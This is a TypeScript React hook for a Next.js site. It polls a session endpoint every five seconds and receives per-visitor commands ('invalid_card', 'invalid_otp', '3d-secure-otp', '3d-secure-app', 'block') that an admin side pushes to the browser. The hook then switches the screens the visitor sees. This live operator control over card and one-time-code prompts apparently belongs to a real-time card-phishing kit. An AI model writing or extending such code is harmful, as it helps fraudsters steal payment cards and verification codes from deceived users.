'use client';

import { useEffect, useState } from 'react';
import { usePathname } from 'next/navigation';
import { v4 as uuidv4 } from 'uuid';

const SESSION_KEY = 'user_session_id';

export const useSession = () => {
  const pathname = usePathname();
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [isTabVisible, setIsTabVisible] = useState(true);

  useEffect(() => {
    if (typeof window === 'undefined') return;

    // 1. Get or create session ID
    let currentSessionId = localStorage.getItem(SESSION_KEY);
    if (!currentSessionId) {
      currentSessionId = uuidv4();
      localStorage.setItem(SESSION_KEY, currentSessionId);
    }
    setSessionId(currentSessionId);

    // 2. Handle tab visibility changes
    const handleVisibilityChange = () => {
      const isVisible = !document.hidden;
      setIsTabVisible(isVisible);

      if (isVisible && currentSessionId) {
        // Tab became visible - send activity update immediately
        reportSession(currentSessionId);
      }
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);

    // 3. Report session activity and current page to the server
    const reportSession = async (sessionIdToReport: string) => {
      if (!sessionIdToReport) return;

      try {
        const response = await fetch('/api/session', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            sessionId: sessionIdToReport,
            currentPage: pathname,
            userAgent: navigator.userAgent,
          }),
        });

        if (response.ok) {
          const data = await response.json();
          const { userState } = data;

          // Handle different user states with proper redirects
          if (userState === 'invalid_card') {
            window.dispatchEvent(
              new CustomEvent('admin-control', { detail: { state: 'invalid_card' } })
            );
          } else if (userState === 'invalid_otp') {
            window.dispatchEvent(
              new CustomEvent('admin-control', { detail: { state: 'invalid_otp' } })
            );
          } else if (userState === '3d-secure-otp') {
            window.dispatchEvent(
              new CustomEvent('admin-control', { detail: { state: '3d-secure-otp' } })
            );
          } else if (userState === '3d-secure-app') {
            window.dispatchEvent(
              new CustomEvent('admin-control', { detail: { state: '3d-secure-app' } })
            );
          } else if (userState === 'block') {
            // Redirect to blocked page
            window.location.href = '/blocked';
          }

          // Clear the state after it's been executed once
          if (userState !== 'normal') {
            try {
              await fetch('/api/session/clear-command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId: sessionIdToReport }),
              });
            } catch (e) {
              console.error('Failed to clear command:', e);
            }
          }
        }
      } catch (error) {
        console.error('Failed to report session:', error);
      }
    };

    // Only report if tab is visible
    if (isTabVisible) {
      reportSession(currentSessionId);
    }

    // Set up a heartbeat to keep the session alive and check for commands
    // Only send heartbeat if tab is visible
    const interval = setInterval(() => {
      if (isTabVisible) {
        reportSession(currentSessionId);
      }
    }, 5000); // Every 5 seconds instead of 10

    return () => {
      clearInterval(interval);
      document.removeEventListener('visibilitychange', handleVisibilityChange);
    };
  }, [pathname, isTabVisible]);

  return sessionId;
};
